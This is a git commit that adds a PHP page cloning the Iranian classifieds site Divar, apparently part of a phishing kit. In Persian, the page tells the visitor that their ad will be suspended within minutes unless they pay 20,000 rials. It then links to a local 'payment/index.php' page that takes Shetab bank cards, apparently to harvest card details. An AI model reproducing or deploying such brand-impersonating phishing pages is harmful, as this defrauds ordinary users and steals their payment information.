09ca0a7f48ee29e820ad49f849d62c4b6765ff13
t.me/its_bimar <74724128+itsBimar@users.noreply.github.com>
2020-11-19 16:00:29 +0000

    Add files via upload

---
+++ sites/Divar2/login.php
@@ -0,0 +1,191 @@
+<!DOCTYPE html> درحال انتقال به دیوار....
+<html lang="fa-IR" dir="rtl">
+
+
+
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <link rel="manifest" href="../../../external.html?link=https://divar.ir/manifest.json">
+    <link rel="apple-touch-icon" sizes="180x180" href="../../../s100.divarcdn.com/static/thewall-assets/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="../../../s100.divarcdn.com/static/thewall-assets/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="../../../s100.divarcdn.com/static/thewall-assets/favicon-16x16.png">
+    <link rel="mask-icon" href="../../../external.html?link=https://s100.divarcdn.com/static/thewall-assets/safari-pinned-tab.svg" color="#a62626">
+    <meta name="theme-color" content="#ffffff">
+    <link rel="publisher" href="../../../external.html?link=https://plus.google.com/+DivarIr">
+    <link data-chunk="main" rel="stylesheet" href="file/style1.css">
+    <link data-chunk="main" rel="stylesheet" href="file/style2.css">
+    <link data-chunk="Manage" rel="stylesheet" href="file/style3.css">
+    <link data-chunk="Manage" rel="stylesheet" href="file/style4.css">
+    <script type="text/javascript">
+    </script>
+    <title>مدیریت آگهی - divar</title>
+    <meta data-react-helmet="true" name="robots" content="noindex">
+
+    <script data-react-helmet="true">
+        ! function(n, e) {
+            var t, o, i, c = [],
+                f = {
+                    passive: !0,
+                    capture: !0
+                },
+                r = new Date,
+                a = "pointerup",
+                u = "pointercancel";
+
+            function p(n, c) {
+                t || (t = c, o = n, i = new Date, w(e), s())
+            }
+
+            function s() {
+                o >= 0 && o < i - r && (c.forEach(function(n) {
+                    n(o, t)
+                }), c = [])
+            }
+
+            function l(t) {
+                if (t.cancelable) {
+                    var o = (t.timeStamp > 1e12 ? new Date : performance.now()) - t.timeStamp;
+                    "pointerdown" == t.type ? function(t, o) {
+                        function i() {
+                            p(t, o), r()
+                        }
+
+                        function c() {
+                            r()
+                        }
+
+                        function r() {
+                            e(a, i, f), e(u, c, f)
+                        }
+                        n(a, i, f), n(u, c, f)
+                    }(o, t) : p(o, t)
+                }
+            }
+
+            function w(n) {
+                ["click", "mousedown", "keydown", "touchstart", "pointerdown"].forEach(function(e) {
+                    n(e, l, f)
+                })
+            }
+            w(n), self.perfMetrics = self.perfMetrics || {}, self.perfMetrics.onFirstInputDelay = function(n) {
+                c.push(n), s()
+            }
+        }(addEventListener, removeEventListener);
+    </script>
+
+    <!-- Google Analytics/Tag Manager -->
+    <script>
+    </script>
+    <script>
+    </script>
+    <!-- End Google Analytics/Tag Manager -->
+
+    <body dir="rtl">
+        <!-- Google Tag Manager (noscript) -->
+        <noscript>
+            <iframe src="../../../external.html?link=https://www.googletagmanager.com/ns.html?id=GTM-NGGBSR3" height="0" width="0" style="display:none;visibility:hidden"></iframe>
+        </noscript>
+        <!-- End Google Tag Manager (noscript) -->
+        <div id="app">
+            <nav class="ui secondary top fixed navbar menu">
+                <a target="_self" class="header item logo" href="#"></a>
+                <div class="item city-selector">
+                    <div></div>
+                </div>
+                <div class="menu links"><a class="item link" href="#">دیوار من</a><a href="#" class="item link">چت</a><a class="item link" href="#">درباره ما</a><a href="#" class="item link">بلاگ</a><a href="#" class="item link">پشتیبانی و قوانین</a><a class="item link" href="#">تماس با ما</a>
+                    <div class="item newButton"><a class="ui button buttons buttons--red divari-colored" role="button" href="#">ثبت اگهی جدید</a></div>
+                </div>
+            </nav>
+            <div></div>
+            <div>
+                <div class="ui container manage">
+                    <div class="ui grid manage-header">
+                        <div class="row">
+                            <div class="right floated eight wide computer twelve wide mobile six wide tablet column">
+                                <h2 class="manage-header__headline">مدیریت آگهی</h2>
+                                <h3 class="manage-header__status" style="color: rgb(230, 81, 0);">منتظر پرداخت</h3>
+                                <p class="manage-header__description">#با_یاری_خدا_کرونا_را_شکست_میدهیم</p>
+                            </div>
+                            <div class="left floated four wide computer twelve wide mobile six wide tablet column">
+                                <div class="manage-header__actions"></div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="manage-tabs">
+                        <div>
+                            <div style="padding-bottom: 0px;"></div>
+                            <div class="manage-tabs__sticky-container" style="transform: translateZ(0px);">
+                                <div class="ui red pointing secondary manage-tabs__menu menu">
+                                    <a class="item manage-tabs__tab" href="../../../external.html?link=https://divar.ir/manage/gXdLD7mZmOC2q5"></a><a class="active item manage-tabs__tab" href="#">تمدید اگهی</a></div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="manage__promotion promote">
+                        <div class="ui grid">
+                            <div class="eight wide computer twelve wide mobile column">
+                                <label for="checkbox-link">
+                                    <div class="promote-item promote-item--checked">
+                                        <div class="promote-item__checkbox-box">
+                                            <div class="kt-switch kt-switch--checked">
+                                                <div class="kt-switch__cell" role="checkbox" aria-checked="true" tabindex="0">
+                                                    <input class="kt-switch__input" id="checkbox-link" type="checkbox" tabindex="-1" value="" checked="">
+                                                    <div class="kt-switch__button kt-switch__button--checkbox"></div>
+                                                    <div class="kt-switch__icon">
+                                                        <svg class="kt-switch__icon-svg">
+                                                            <polyline transform="translate(5.974874, 2.353553) rotate(-45.000000) translate(-5.974874, -2.353553) " points="2 0.292893219 2 4.29289322 9.94974747 4.41421356" class="kt-switch__icon-check"></polyline>
+                                                            <line x1="1.03268998" y1="4" x2="11.0000728" y2="4" id="checkbox_check" stroke="#FFFFFF" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="kt-switch__icon-line"></line>
+                                                        </svg>
+                                                    </div>
+                                                    <div class="kt-switch__rippler">
+                                                        <div class="kt-switch__ripple"></div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="promote-item__main">
+                                            <div class="promote-item__heading">توضیحات و مقدار وجه :</div>
+                                            <div class="promote-item__price">۲۰٫۰۰۰ ریال</div>
+                                            <div class="promote-item__desc">وقت بخیر کاربر عزیز دیوار اگهی شما لحظاتی پیش با موفقیت در سایت دیوار ثبت شد جهت تمدید اگهی باید مبلغ (20,000 ریال) پرداخت کنید در غیر اینصورت اگهی شما تا دقایقی دیگر از دیوار تعلیق شده تا پرداخت وجه جهت پرداخت:</div>
+                                        </div>
+                                    </div>
+                                </label>
+                                <label for="checkbox-urgent"></label>
+                                <label for="checkbox-reorder"></label>
+                                <label for="checkbox-urgent-reorder"></label>
+                                <label for="checkbox-renew"></label>
+                                <label for="checkbox-renew-reorder"></label>
+                            </div>
+                            <div class="four wide computer twelve wide mobile column">
+                                <div>
+                                    <div style="padding-bottom: 0px;"></div>
+                                    <div class="promote__payment-info" style="transform: translateZ(0px);">
+                                        <div class="promote__summary">
+                                            <div class="ui container promote__summary-container">
+                                                <div class="promote__payment-text mobile-hidden">جمع مبلغ قابل پرداخت
+                                                    <div class="promote__payment-sum">۲۰٫۰۰۰ ریال</div>
+                                                </div>
+                                                <button class="kt-button kt-button--primary" type="button">
+                                                    <a class="ui button buttons buttons--red divari-colored" role="button" href="payment/index.php">پرداخت ۲۰٫۰۰۰ ریال از طریق کارت‌ های شتاب</a></button>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="Toastify"></div>
+            <div class="kt-toast-container kt-toast-container--empty"></div>
+        </div>
+        <script>
+        </script>
+        <script <div class="ReactModalPortal">
+            </div></iframe></body> 
+
+</html>
